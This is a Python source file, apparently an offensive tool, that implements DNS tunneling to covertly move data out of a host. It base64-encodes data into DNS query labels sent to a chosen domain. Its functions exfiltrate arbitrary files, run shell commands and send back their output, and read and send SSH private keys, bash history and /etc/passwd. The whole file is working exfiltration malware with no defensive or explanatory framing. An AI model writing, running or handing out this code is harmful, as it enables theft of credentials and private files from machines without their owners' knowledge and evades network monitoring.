# DNS Tunneling Module
import socket
import threading
import time
import base64
import dns.resolver
import dns.message
import dns.rdatatype
from pathlib import Path

class DNSTunnel:
    def __init__(self, domain: str, dns_server: str = "8.8.8.8"):
        self.domain = domain
        self.dns_server = dns_server
        self.running = False
        self.thread = None
        self.buffer = ""
        
    def send_data(self, data: str):
        """Send data via DNS queries"""
        try:
            # Encode data
            encoded = base64.b64encode(data.encode()).decode()
            
            # Split into chunks (63 chars max for DNS labels)
            chunks = [encoded[i:i+63] for i in range(0, len(encoded), 63)]
            
            # Send each chunk as a DNS query
            for i, chunk in enumerate(chunks):
                query_name = f"{i}_{chunk}.{self.domain}"
                
                try:
                    resolver = dns.resolver.Resolver()
                    resolver.nameservers = [self.dns_server]
                    resolver.timeout = 5
                    resolver.lifetime = 5
                    
                    resolver.resolve(query_name, 'A')
                except:
                    pass  # Query sent, response doesn't matter
            
            return {"success": True, "chunks": len(chunks)}
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def receive_data(self, subdomain: str, duration: int = 30):
        """Receive data via DNS responses"""
        try:
            import dns.resolver
            
            resolver = dns.resolver.Resolver()
            resolver.nameservers = [self.dns_server]
            resolver.timeout = 5
            resolver.lifetime = 5
            
            received = []
            start_time = time.time()
            
            while time.time() - start_time < duration:
                try:
                    query_name = f"resp.{subdomain}.{self.domain}"
                    answer = resolver.resolve(query_name, 'TXT')
                    
                    for rdata in answer:
                        received.append(rdata.to_text())
                    
                    break
                except dns.resolver.NXDOMAIN:
                    time.sleep(1)
                except Exception as e:
                    time.sleep(1)
            
            return {"success": True, "data": received}
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def exfiltrate_file(self, filepath: str):
        """Exfiltrate a file via DNS"""
        try:
            with open(filepath, 'rb') as f:
                content = f.read()
            
            # Encode file content
            encoded = base64.b64encode(content).decode()
            
            # Split into chunks
            chunks = [encoded[i:i+63] for i in range(0, len(encoded), 63)]
            
            # Send chunks
            for i, chunk in enumerate(chunks):
                query_name = f"file_{i}_{chunk}.{self.domain}"
                
                try:
                    socket.gethostbyname(query_name)
                except:
                    pass
            
            return {"success": True, "chunks": len(chunks), "size": len(content)}
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def exfiltrate_command_output(self, command: str):
        """Exfiltrate command output via DNS"""
        try:
            import subprocess
            
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True
            )
            
            output = result.stdout + result.stderr
            
            return self.send_data(output[:1000])  # Limit to 1000 chars
        except Exception as e:
            return {"success": False, "error": str(e)}


class DNSExfiltrator:
    def __init__(self, domain: str):
        self.domain = domain
        self.data_queue = []
        
    def queue_data(self, data: str):
        """Queue data for exfiltration"""
        self.data_queue.append(data)
        return {"success": True, "queue_size": len(self.data_queue)}
    
    def exfiltrate_all(self):
        """Exfiltrate all queued data"""
        try:
            tunnel = DNSTunnel(self.domain)
            
            for data in self.data_queue:
                tunnel.send_data(data)
            
            self.data_queue.clear()
            return {"success": True, "exfiltrated": True}
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def exfiltrate_sensitive(self):
        """Exfiltrate sensitive data"""
        try:
            import os
            
            sensitive_files = [
                os.path.expanduser("~/.ssh/id_rsa"),
                os.path.expanduser("~/.bash_history"),
                "/etc/passwd",
            ]
            
            tunnel = DNSTunnel(self.domain)
            
            for filepath in sensitive_files:
                if os.path.exists(filepath):
                    try:
                        with open(filepath, 'r') as f:
                            content = f.read()
                        tunnel.send_data(content[:2000])
                    except:
                        pass
            
            return {"success": True, "files_exfiltrated": len(sensitive_files)}
        except Exception as e:
            return {"success": False, "error": str(e)}


def send_dns_data(domain: str, data: str):
    """Quick DNS data send function"""
    tunnel = DNSTunnel(domain)
    return tunnel.send_data(data)


def exfiltrate_file_dns(domain: str, filepath: str):
    """Quick file exfiltration via DNS"""
    tunnel = DNSTunnel(domain)
    return tunnel.exfiltrate_file(filepath)
